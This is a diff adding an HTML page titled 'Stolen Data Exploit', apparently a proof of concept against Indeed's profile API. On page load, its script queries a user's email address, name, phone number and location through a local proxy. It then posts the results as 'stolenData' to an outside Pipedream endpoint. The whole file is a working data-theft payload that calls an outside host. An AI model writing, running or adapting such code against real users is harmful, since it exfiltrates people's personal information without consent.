@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stolen Data Exploit</title>
+</head>
+<body>
+  <h1>Exploit Running...</h1>
+  <script>
+    // Send GraphQL request to Indeed's profile API (via Flask proxy server)
+    fetch("http://localhost:5000/proxy", {  // Send request to the Flask proxy server
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        query: `query {
+          currentUser {
+            account {
+              emailAddress
+              __typename
+            }
+            __typename
+          }
+          jobSeekerProfile {
+            profile {
+              defaultInfo {
+                contactInformation {
+                  firstName
+                  lastName
+                  phoneNumber
+                  location {
+                    formattedLocation
+                    city
+                    country
+                    __typename
+                  }
+                  __typename
+                }
+                __typename
+              }
+              __typename
+            }
+            __typename
+          }
+        }`
+      })
+    })
+    .then(response => response.json())  // Parse the response from the GraphQL API
+    .then(data => {
+      // Send the stolen data to Pipedream
+      fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {  // Replace with your Pipedream URL
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({ stolenData: data })  // Send stolen data to Pipedream
+      })
+      .then(pipedreamResponse => {
+        if (pipedreamResponse.ok) {
+          console.log("Data sent successfully to Pipedream");
+        }
+      })
+      .catch(error => {
+        console.error("Error sending data to Pipedream:", error);
+      });
+    })
+    .catch(console.error);
+  </script>
+</body>
+</html>
